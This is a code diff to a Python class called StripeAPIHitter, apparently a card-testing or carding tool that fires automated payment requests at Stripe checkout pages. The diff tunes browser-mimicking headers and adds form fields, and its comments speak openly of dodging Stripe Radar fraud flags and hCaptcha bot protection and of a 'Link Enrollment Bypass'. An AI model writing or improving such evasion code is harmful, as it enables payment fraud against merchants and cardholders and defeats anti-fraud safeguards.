@@ -937,11 +937,14 @@ class StripeAPIHitter:
                     # Use rotated Stripe.js hash — stale static hashes get flagged by Radar
                     "payment_user_agent": _payment_user_agent,
                     "time_on_page": str(timing_ms),
+                    "pasted_fields": "number",
                     "guid": stripe_tokens['guid'],
                     "muid": stripe_tokens['muid'],
                     "sid": stripe_tokens['sid'],
                     "key": self.pk_live,
                 }
+                if isinstance(self.cs_live, str) and self.cs_live.startswith('cs_'):
+                    pm_data["payment_pages_checkout_session"] = self.cs_live
                 # Step 1.5: Algorithm 4 - Stripe Link Enrollment Bypass
                 # [DISABLED] Initiating unverified Link sessions often triggers `rqdata` (hCaptcha) 
                 # bot protection on strict merchants like Foyer Tech. It's safer to skip it.
@@ -972,7 +975,7 @@ class StripeAPIHitter:
                     el_headers["referer"] = checkout_page_url
                     el_headers["accept-language"] = "en-US,en;q=0.9"
                     el_headers["Stripe-Version"] = "2026-06-24.dahlia"
-                    el_headers["sec-fetch-site"] = "cross-site"
+                    el_headers["sec-fetch-site"] = "same-site"
                     el_headers["sec-fetch-mode"] = "cors"
                     el_headers["sec-fetch-dest"] = "empty"
                     await loop.run_in_executor(None, lambda: _cffi_session.get(
@@ -984,7 +987,7 @@ class StripeAPIHitter:
                 pm_headers = headers.copy()
                 pm_headers["Idempotency-Key"] = pm_idempotency
                 pm_headers["accept-language"] = "en-US,en;q=0.9"
-                pm_headers["sec-fetch-site"] = "cross-site"
+                pm_headers["sec-fetch-site"] = "same-site"
                 pm_headers["sec-fetch-mode"] = "cors"
                 pm_headers["sec-fetch-dest"] = "empty"
                 pm_headers["referer"] = checkout_page_url
@@ -1055,7 +1058,7 @@ class StripeAPIHitter:
                 confirm_headers["Idempotency-Key"] = confirm_idempotency
                 # Real browsers always send sec-fetch headers on XHR/fetch calls from a loaded page
                 confirm_headers["accept-language"] = "en-US,en;q=0.9"
-                confirm_headers["sec-fetch-site"] = "cross-site"
+                confirm_headers["sec-fetch-site"] = "same-site"
                 confirm_headers["sec-fetch-mode"] = "cors"
                 confirm_headers["sec-fetch-dest"] = "empty"
                 confirm_headers["referer"] = checkout_page_url
